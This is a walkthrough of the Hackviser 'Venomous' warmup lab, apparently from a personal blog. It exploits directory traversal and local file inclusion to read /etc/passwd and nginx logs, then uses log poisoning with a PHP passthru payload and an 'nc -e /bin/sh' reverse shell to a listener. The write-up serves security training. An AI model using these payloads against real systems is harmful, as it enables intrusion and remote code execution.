---
title: 'Venomous'
date: '2026-03-19'
excerpt: 'Practice detecting and exploiting file upload, directory traversal and LFI vulnerabilities in web applications running on Nginx web server, and getting reverse shell using log poisoning.'
prog: 'Hackviser Warmup Stage 2  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_logo.png" alt="Venomous logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Venomous</h1>
<div class="writeup-date">March 2026 &middot; Warmup Stage 2</div>
</div>
</div>
<p class="lead mb-4">This warmup machine focuses on teaching how to exploit the directory traversal vulnerability, which causes access to the file system on the server, and the LFI vulnerability, which causes the inclusion of local files in the web application. It is recommended for practicing detecting and exploiting file upload, directory traversal and LFI vulnerabilities in web applications running on Nginx web server, and getting reverse shell using log poisoning.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the name of the running web server?</p>
<p class="mb-3">Use nmap to scan the target machine and identify open ports with <code>nmap -sC -sV -A [target IP]</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image1.png" alt="Venomous Image 1" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> nginx</p>

<p class="mb-2"><strong>Question 2:</strong> Which GET parameter used to display an invoice?</p>
<p class="mb-3">Open the target IP in a web browser. We can see that the Invoice tab is available.</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image2.png" alt="Venomous Image 2" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">When we open the Invoice tab, we click Download Report and a new browser tab opens with the invoice details.</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image3.png" alt="Venomous Image 3" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> invoice</p>


<p class="mb-2"><strong>Question 3:</strong> What is the payload of the directory traversal attack to access the passwd file on the system?</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image4.png" alt="Venomous Image 4" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> ../../../../etc/passwd</p>

<p class="mb-2"><strong>Question 4:</strong> What does LFI vulnerability stand for?</p>
<p class="mb-5"><strong>Answer:</strong> Local File Inclusion</p>

<p class="mb-2"><strong>Question 5:</strong> What is the default path of nginx access logs?</p>
<p class="mb-3">When we use the payload <code>../../../../var/log/nginx/access.log</code>, the output is hard to read as seen below.</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image5.png" alt="Venomous Image 5" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">To make the output more readable, we can use append the <code>view-source:</code> prefix in the browser's address bar.</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image6.png" alt="Venomous Image 6" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> /var/log/nginx/access.log</p>

<p class="mb-2"><strong>Question 6:</strong> What is the IP address of the user who first accessed the site?</p>
<p class="mb-3">We will use the payload <code>../../../../var/log/nginx/access.log.1</code> to view the previous access logs.</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image7.png" alt="Venomous Image 7" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> 10.0.10.4</p>

<p class="mb-2"><strong>Question 7:</strong> What is the last modified time of show-invoice.php file?</p>
<p class="mb-3">To solve this task, we need to be able to execute commands on the target machine. We will open the terminal and run <code>nc [target IP] 80</code>. Then we use <code>GET /&lt;?php passthru('id'); ?&gt; HTTP/1.1</code>, <code>Host: [target IP]</code> and <code>Connection: close</code>. Then we can see in the Nginx logs that the <code>id</code> command was executed.</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image8.png" alt="Venomous Image 8" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Now to enable reverse shell on the target machine, we need to open two terminals. The first terminal will act as the listener, and the second terminal will be used to send the payload. On the first terminal, run the command <code>nc -lvnp 1337</code>.</p>
<p class="mb-3">On the second terminal, we will use the payload <code>nc [target IP] 80</code>, then <code>GET /&lt;?php passthru('nc -e /bin/sh [local IP] 1337'); ?&gt; HTTP/1.1 </code><code>Host: [target IP]</code> and <code>Connection: close</code>. After sending the payload, we need to return to the browser tab that was displaying the Nginx access logs and refresh it. In a short while, we now have a shell on the target machine.</p>
<p class="mb-3">Now that we have a shell on the target machine, we can use the command <code>ls -al</code> to view the files in the current directory. We can see that the file show-invoice.php is present. We will use the command <code>stat show-invoice.php</code> to view its last modified time.</p>
<img src="/assets/hackinglabs/hackviser/warmups/venomous/venomous_hackviser_image9.png" alt="Venomous Image 9" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> 19:23</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the <a href="/hacking-labs/hackviser/warmups/satellite.html">next Hacking Lab</a>.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">March 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>